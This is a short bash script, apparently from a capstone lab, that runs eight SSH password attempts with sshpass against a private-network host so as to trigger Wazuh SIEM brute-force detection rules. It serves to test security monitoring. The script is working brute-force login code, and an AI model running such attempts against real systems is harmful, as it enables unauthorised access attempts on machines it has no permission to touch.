# --- CAPSTONE ATTACK SCRIPT: RULE 5763 / 5712 (SSH BRUTEFORCE) ---

#!/bin/bash
TARGET="192.168.202.142"
USER="admin"

echo "Initiating SSH Brute-Force Attack on $TARGET as external threat..."
for i in {1..8}; do
    echo "Attempt $i with fake password..."
    sshpass -p "HackedPass123!_$i" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 $USER@$TARGET 2>/dev/null
    sleep 1
done
echo "Attack simulation complete! Check Wazuh SIEM for Rules 5712, 5720, and 5763."